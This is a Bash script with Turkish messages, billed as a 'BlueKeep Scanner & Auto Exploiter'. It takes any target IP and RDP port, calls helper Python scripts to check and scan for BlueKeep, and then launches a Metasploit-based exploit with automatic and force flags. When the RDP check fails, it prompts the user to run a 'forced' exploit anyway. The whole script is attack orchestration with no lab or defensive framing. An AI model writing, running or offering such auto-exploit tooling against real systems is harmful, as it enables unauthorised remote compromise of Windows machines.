#!/bin/bash

# Renkli çıktı için
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}"
cat << "EOF"
 ____  __           __ __                
/ __ )/ /_  _____  / //_/__  ___ ____    
/ __  / / / / / _ \/ ,< / _ \/ -_) __/    
/ /_/ / /___/ /  __/ /| /  __/\__/_/     
/_____/_____/_/\___/_/ |_\___/            
                                         
EOF
echo -e "BlueKeep Scanner & Auto Exploiter\n${NC}"

# Kontrol parametreleri
if [ $# -lt 1 ]; then
    echo -e "${RED}Kullanım: $0 <hedef-ip> [port]${NC}"
    exit 1
fi

TARGET_IP=$1
PORT=${2:-3389}

# Gelişmiş RDP kontrolü
echo -e "${YELLOW}[*] Gelişmiş RDP kontrolü başlatılıyor: $TARGET_IP:$PORT...${NC}"
python3 check_rdp_detailed.py -i $TARGET_IP -p $PORT

if [ $? -ne 0 ]; then
    echo -e "${RED}[-] Hedef sistemde RDP servisi bulunamadı veya erişilebilir değil${NC}"
    echo -e "${YELLOW}[?] Yine de zorla exploit denemek istiyor musunuz? (e/h)${NC}"
    read answer
    if [[ "$answer" != "e" && "$answer" != "E" ]]; then
        exit 1
    fi
    echo -e "${YELLOW}[*] Zorla exploit çalıştırılıyor...${NC}"
    python3 force_bluekeep.py -i $TARGET_IP -p $PORT
    exit $?
fi

# Tarama işlemi
echo -e "${YELLOW}[*] BlueKeep taraması başlatılıyor...${NC}"
python3 bluekeep_scanner.py -i $TARGET_IP -p $PORT

# İşletim sistemi tespiti ve exploit
echo -e "${YELLOW}[*] İşletim sistemi tespiti ve exploit başlatılıyor...${NC}"
python3 metasploit_bluekeep.py -i $TARGET_IP -p $PORT -A -f

echo -e "${GREEN}[+] İşlem tamamlandı${NC}"
